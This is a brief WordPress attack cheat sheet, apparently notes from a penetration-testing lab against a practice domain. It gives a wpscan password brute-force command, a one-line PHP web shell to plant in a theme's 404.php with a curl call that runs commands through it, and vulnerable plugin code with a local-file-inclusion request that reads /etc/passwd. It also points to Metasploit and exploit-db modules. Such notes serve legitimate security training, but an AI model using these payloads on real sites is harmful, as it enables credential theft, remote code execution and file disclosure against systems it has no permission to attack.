# Attacking WordPress

## Login Bruteforce

```bash
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

## Code Execution

If you can get to edit a theme with php code, then you can do like this:

On an uncommon page: uncommon page such as 404.php

```php
<?php
    system($_GET[0]);
?>
```

Then:

```bash
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```

Another method is to use metasploit: [wp_admin_shell_upload](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/)


## Leveraging Known Vulnerabilities

### Vulnerable Plugins - mail-masta

Its code is so vulnerable:

```php
<?php 

include($_GET['pl']);
global $wpdb;

$camp_id=$_POST['camp_id'];
$masta_reports = $wpdb->prefix . "masta_reports";
$count=$wpdb->get_results("SELECT count(*) co from  $masta_reports where camp_id=$camp_id and status=1");

echo $count[0]->co;

?>
```

can be exploited like:

```bash
curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

### Vulnerable Plugins - wpDiscuz

Can use this exploit: [Plugin wpDiscuz 7.0.4](https://www.exploit-db.com/exploits/49967)

